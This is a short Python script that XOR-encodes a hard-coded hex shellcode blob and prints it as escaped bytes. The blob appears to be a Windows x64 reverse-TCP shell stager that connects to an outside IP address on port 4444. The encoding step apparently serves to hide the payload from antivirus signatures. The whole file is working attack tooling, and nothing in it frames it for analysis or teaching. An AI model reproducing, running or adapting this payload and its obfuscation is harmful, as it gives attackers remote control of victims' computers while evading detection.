def xor_encrypt_decrypt_hex(payload_hex, key):
    # Convert hexadecimal payload to bytes
    payload_bytes = bytes.fromhex(payload_hex)

    # Convert key to bytes
    key_bytes = bytearray(key, 'utf-8')

    # XOR each byte of the payload with the corresponding byte of the key
    encrypted_bytes = bytearray([b1 ^ b2 for b1, b2 in zip(payload_bytes, key_bytes)])
    # Convert the result back to a hexadecimal string
    encrypted_payload_hex =  ''.join("\\x{:02x}".format(b) for b in encrypted_bytes)

    return encrypted_payload_hex


# Example usage
payload_hex = "fc4883e4f0e8cc00000041514150524831d265488b52605156488b5218488b5220488b72504d31c9480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40204901d0508b4818e35648ffc94d31c9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc0200115ca747c1fa41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5"
key = "s"*len(payload_hex)

# Encrypt the payload
encrypted_payload_hex = xor_encrypt_decrypt_hex(payload_hex, key)
print("Encrypted Payload (Hex):", encrypted_payload_hex)
